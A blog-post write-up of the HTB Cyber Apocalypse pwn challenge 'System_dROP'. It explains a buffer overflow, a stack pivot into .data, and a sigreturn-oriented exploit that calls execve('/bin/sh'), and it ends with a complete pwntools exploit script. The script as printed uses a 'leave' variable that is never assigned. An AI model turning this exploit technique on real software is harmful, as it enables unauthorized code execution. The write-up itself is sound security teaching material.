<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>1801811567  - HTB Cyber-Apocalypse</title>
  <meta name="description" content="System_dROP">
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="/htb/pwn/writeup/srop/2021/05/09/Cyber-Apocalypse.html">
  </head>


  <body>

    <header class="site-header" role="banner">

  <div class="wrapper">
    <a class="site-title" href="/">1801811567</a>
    <br />
    
      <a href="https://github.com/kvn11" target="_blank"><span class="icon"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

    
    
      <a href="https://twitter.com/jekyllrb" target="_blank"><span class="icon"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

    
    

  </div>

</header>


    <main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">HTB Cyber-Apocalypse</h1>
    <p class="post-meta">Last update : </p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <h1 id="system_drop">System_dROP</h1>

<p>Running this through Ghidra we see a very straight-forward buffer overflow. We have a buffer of 32 bytes, and the program reads in 256 bytes. Additionally, the title of the challenge hints at using the SROP technique to exploit this overflow.</p>

<p><img src="/assets/images/cy_ap/system_drop1.png" alt="Ghidra Result" title="Ghidra Result" /></p>

<p>Using vmmap in GDB we obtain more information. The stack is non-executable and we can write to the addresses of <code class="language-plaintext highlighter-rouge">0x00601000 - 0x00602000</code>. These addresses correspond to the <code class="language-plaintext highlighter-rouge">.bss</code> and <code class="language-plaintext highlighter-rouge">.data</code> sections of the binary.</p>

<p><img src="/assets/images/cy_ap/system_drop2.png" alt="Ghidra Result" title="Ghidra Result" /></p>

<p>Let’s begin by drawing out the strategy we will take.
The SROP technique requires the ability to write a signal return frame to some area in memory, which we then call on to set the “context” of the program such as all the registers and flags.
It is a very powerful technique since it will allow us the ability to call any function.
The signal return frame is called by the sigret system call, so we need to place it before the frame.
The issue here is that we can only read in 256 bytes, but the syscall address is 8 bytes and the frame is 248.
Therefore this attack will require several reads.
Since we can’t execute shell code anywhere in memory we should use the sig return frame to call execve.
This means we need to have the string <code class="language-plaintext highlighter-rouge">/bin/sh</code> saved somewhere and we need to set the RAX register to <code class="language-plaintext highlighter-rouge">0x3B</code>.
A quick search with ropper in gdb revealed that we do not have gadgets to set RAX.
However we do have gadgets for RDI and RSI so we can at least modify the first two arguments of the functions available to us.
This also means we can’t change the amount of data that the read function will take, so we are limited to 256 bytes.
Since we can write to <code class="language-plaintext highlighter-rouge">.data</code>, we should store our materials there. First we will read in <code class="language-plaintext highlighter-rouge">/bin/sh</code>, followed by the syscall gadget, and finally the sigret frame.
By storing part of our ROP chain on the <code class="language-plaintext highlighter-rouge">.data</code> section, we will have to modify the stack pointer to point to there instead as well.
So lets begin writing our exploit by first listing out the addresses we will need:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'0x41'</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">32</span>
<span class="n">data_addr</span> <span class="o">=</span> <span class="mh">0x00601028</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0040053b</span><span class="p">)</span>   <span class="c1"># syscall; ret;
</span><span class="n">pop_rsp</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004005cd</span><span class="p">)</span>   <span class="c1"># pop rsp; pop r13; pop r14; pop r15; ret;
</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004005d3</span><span class="p">)</span>   <span class="c1"># pop rdi; ret;
</span><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004005d1</span><span class="p">)</span>   <span class="c1"># pop rsi; pop r15; ret;
</span><span class="n">read_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400440</span><span class="p">)</span> <span class="c1"># read; ret;
</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0040056e</span><span class="p">)</span>             <span class="c1"># leave; ret;
</span></code></pre></div></div>

<p>Most of these should be self-explanatory. The offset was calculated by experimentation through GDB. Just pass in some patterned input greater than 32 bytes and see what part of the pattern overwrite the return address.
It is important to note that the RBP pointer is stored right before the return address.
We need to overwrite this RBP pointer so that we can modify the location of the stack.
Since we want the <code class="language-plaintext highlighter-rouge">.data</code> section to be our new stack, we should overwrite it with <code class="language-plaintext highlighter-rouge">data_addr</code>.
Since we got a segmentation fault at an input of 40 bytes, then we know the RBP value is at 32 bytes, hence the offset being 32.</p>

<p>Next lets prepare our first payload:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># First read sets up second read, where we save /bin/sh to .data, and also rewrites rbp to .data
</span><span class="n">p1</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rsi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">read_addr</span>

<span class="c1"># We also need to save the syscall and sigret frame to .data section
</span><span class="n">p2</span> <span class="o">=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rsi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">read_addr</span>

<span class="c1"># Need to do 1 more read to set EAX to 15 (sigret) and also pivot into our new stack
</span><span class="n">p3</span> <span class="o">=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rsi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">read_addr</span> <span class="o">+</span> <span class="n">leave</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p1</span> <span class="o">+</span> <span class="n">p2</span> <span class="o">+</span> <span class="n">p3</span>
</code></pre></div></div>
<p>The first part of the payload will set up the program to call read again so we can pass in <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> and will save it to the start of the <code class="language-plaintext highlighter-rouge">.data</code> section.
Remember that execve() requires a null terminated string as the first argument.
The second part of the payload is almost the same as the first, except that now we save the syscall gadget as well as the sig ret frame immediately after the <code class="language-plaintext highlighter-rouge">/bin/sh</code> string.
The last part of the payload is similar to the first in that we are again doing another read.
However, this time what we read doesn’t matter.
We need to set the RAX register to the sigret system call <code class="language-plaintext highlighter-rouge">0xf</code> or 15 in decimal.
Since we have no gadgets available for this, we must utilize the return value of the read() function. According to the linux man page:</p>

<p><em>
“
On success, the number of bytes read is returned (zero indicates
end of file), and the file position is advanced by this number.
It is not an error if this number is smaller than the number of
bytes requested; this may happen for example because fewer bytes
are actually available right now (maybe because we were close to
end-of-file, or because we are reading from a pipe, or from a
terminal), or because read() was interrupted by a signal.  See
also NOTES.
On error, -1 is returned, and errno is set to indicate the error.
In this case, it is left unspecified whether the file position
(if any) changes.On success, the number of bytes read is returned (zero indicates
end of file), and the file position is advanced by this number.
It is not an error if this number is smaller than the number of
bytes requested; this may happen for example because fewer bytes
are actually available right now (maybe because we were close to
end-of-file, or because we are reading from a pipe, or from a
terminal), or because read() was interrupted by a signal.  See
also NOTES.
On error, -1 is returned, and errno is set to indicate the error.
In this case, it is left unspecified whether the file position
(if any) changes.
“
</em></p>

<p>Basically, if we send the program 15 bytes, then we set the RAX register with our desired value and thus we are able to call the sigret.
And that’s what the third part of the payload allows us to do.
It also calls <code class="language-plaintext highlighter-rouge">leave;</code> which essentially resets the stack pointer to the value of RBP, which we have overwritten with <code class="language-plaintext highlighter-rouge">.data</code> section address.
So we have also set up our stack redirection.
Now lets set up our sig ret frame:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">data_addr</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">256</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rbp</span> <span class="o">=</span> <span class="n">data_addr</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x0040053b</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">data_addr</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x00</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x00</span>
</code></pre></div></div>
<p>Now lets go over what each of these values will accomplish.
We will change the RSP to point to the address after our frame, since that makes the most natural sense and mimics what a real program would.
This address does not matter too much, as long as you can read and write to it.
We set the RBP to point to the <code class="language-plaintext highlighter-rouge">.data</code> address, since that’s what it was before the system call.
This address doesn’t matter too much either.
The RIP register will point at the <code class="language-plaintext highlighter-rouge">syscall; ret;</code> gadget, so once the frame gets called we are call upon execve with all its arguments already set.
RAX is set to the syscall value of execve.
RDI is the address of <code class="language-plaintext highlighter-rouge">.data</code> because remember that is where our null terminated <code class="language-plaintext highlighter-rouge">/bin/sh</code> was written to.
And since we only need to set the first arg, then we can leave the others as null.
Now all that remains is to send our payloads. The full exploit can be viewed below.
An important thing to note is that the binary will continue to read until it has read 256 bytes, unless we put in a timer.
In order to save time I only used a timer for the last read and just filled up the buffer with junk in the others.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./system_drop'</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'amd64'</span><span class="p">)</span>

<span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'0x41'</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">offset</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">32</span>
<span class="n">data_addr</span> <span class="o">=</span> <span class="mh">0x00601028</span>
<span class="n">syscall</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0040053b</span><span class="p">)</span>   <span class="c1"># syscall; ret;
</span><span class="n">pop_rsp</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004005cd</span><span class="p">)</span>   <span class="c1"># pop rsp; pop r13; pop r14; pop r15; ret;
</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004005d3</span><span class="p">)</span>   <span class="c1"># pop rdi; ret;
</span><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x004005d1</span><span class="p">)</span>   <span class="c1"># pop rsi; pop r15; ret;
</span><span class="n">read_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00400440</span><span class="p">)</span> <span class="c1"># read; ret;
</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0040056e</span><span class="p">)</span>             <span class="c1"># leave; ret;
</span>
<span class="c1"># First read sets up second read, where we save /bin/sh to .data, and also rewrites rbp to .data
</span><span class="n">p1</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rsi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">read_addr</span> 

<span class="c1"># We also need to save the syscall and sigret frame to .data section
</span><span class="n">p2</span> <span class="o">=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rsi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">read_addr</span>

<span class="c1"># Need to do 1 more read to set EAX to 15 (sigret) and also pivot into our new stack
</span><span class="n">p3</span> <span class="o">=</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">pop_rsi</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_addr</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">256</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">read_addr</span> <span class="o">+</span> <span class="n">leave</span>

<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">data_addr</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">256</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rbp</span> <span class="o">=</span> <span class="n">data_addr</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x0040053b</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">data_addr</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x00</span>
<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x00</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">exe</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">p1</span> <span class="o">+</span> <span class="n">p2</span> <span class="o">+</span> <span class="n">p3</span>
<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>

<span class="c1"># 2nd read saves /bin/sh
</span><span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="s">"B"</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>

<span class="c1"># 3rd read saves the syscall + sigret frame
</span><span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">syscall</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>

<span class="c1"># 4th read sets RAX to 15:
</span><span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"E"</span> <span class="o">*</span> <span class="mi">15</span><span class="p">)</span>
<span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

  </div>

</article>

      </div>
    </main>

  </body>

</html>
